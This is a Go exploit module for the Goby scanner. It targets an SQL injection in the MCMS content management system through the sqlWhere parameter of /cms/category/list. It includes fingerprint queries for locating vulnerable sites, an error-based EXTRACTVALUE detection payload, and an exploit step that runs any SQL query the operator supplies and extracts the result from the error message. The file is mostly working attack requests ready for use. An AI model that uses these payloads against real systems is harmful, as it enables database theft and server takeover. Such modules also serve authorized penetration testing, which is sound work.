package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "MCMS list Interface sqlWhere Sql Injection Vulnerability",
    "Description": "<p>MCMS is a set of lightweight open source content management system developed based on java. It is simple, safe, open source and free. It can run on Linux, Windows, MacOSX, Solaris and other platforms. The system has an sql injection vulnerability before the 5.2.10 version. You can use this vulnerability to obtain sensitive information</p>",
    "Product": "MCMS",
    "Homepage": "https://gitee.com/mingSoft/MCMS",
    "DisclosureDate": "2022-11-30",
    "Author": "树懒",
    "FofaQuery": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\"",
    "GobyQuery": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cms/category/list",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "sqlWhere=%5B%7B%22action%22%3A%22%22%2C%22field%22%3A%221%20AND%20EXTRACTVALUE(4095%2CCONCAT(0x5c%2C0x717a6a6271%2C(SELECT%20(ELT(4095%3D4095%2C1)))%2C0x716b6a7871))%22%2C%22el%22%3A%22eq%22%2C%22model%22%3A%22contentTitle%22%2C%22name%22%3A%22%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%22%2C%22type%22%3A%22input%22%2C%22value%22%3A%22a%22%7D%5D\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qzjbq1qkjxq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cms/category/list",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "sqlWhere=[{\"action\"%3a\"\",\"field\"%3a\"1+AND+EXTRACTVALUE(4095,CONCAT(0x5c,0x717a6a6271,({{{sql}}}),0x716b6a7871))\",\"el\":\"eq\",\"model\":\"contentTitle\",\"name\":\"123\",\"type\":\"input\",\"value\":\"a\"}]"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|qzjbq(.*)qkjxq"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "铭飞 CMS list 接口 sqlWhere 参数 sql 注入漏洞",
            "Product": "MCMS",
            "Description": "<p>铭飞CMS是一款基于java开发的一套轻量级开源内容管理系统,铭飞CMS简洁、安全、开源、免费,可运行在Linux、Windows、MacOSX、Solaris等各种平台上,专注为公司企业、个人站长快速建站提供解决方案, 该系统在5.2.10版本以前存在sql注入漏洞，能够利用该漏洞获取敏感信息<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "MCMS list Interface sqlWhere Sql Injection Vulnerability",
            "Product": "MCMS",
            "Description": "<p>MCMS is a set of lightweight open source content management system developed based on java. It is simple, safe, open source and free. It can run on Linux, Windows, MacOSX, Solaris and other platforms. The system has an sql injection vulnerability before the 5.2.10 version. You can use this vulnerability to obtain sensitive information</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10774"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}